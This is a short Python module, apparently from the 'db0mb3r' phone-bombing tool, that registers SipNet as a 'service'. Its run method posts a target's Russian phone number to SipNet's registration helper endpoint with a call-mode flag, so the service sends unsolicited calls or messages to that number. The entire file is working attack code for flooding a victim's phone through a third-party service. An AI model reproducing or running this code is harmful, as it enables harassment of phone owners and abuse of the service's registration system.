from db0mb3r.services.service import Service


class SipNet(Service):
    phone_codes = [7]

    async def run(self):
        await self.post(
            "https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",
            params={"oper": 9, "callmode": 1, "phone": self.phone},
        )
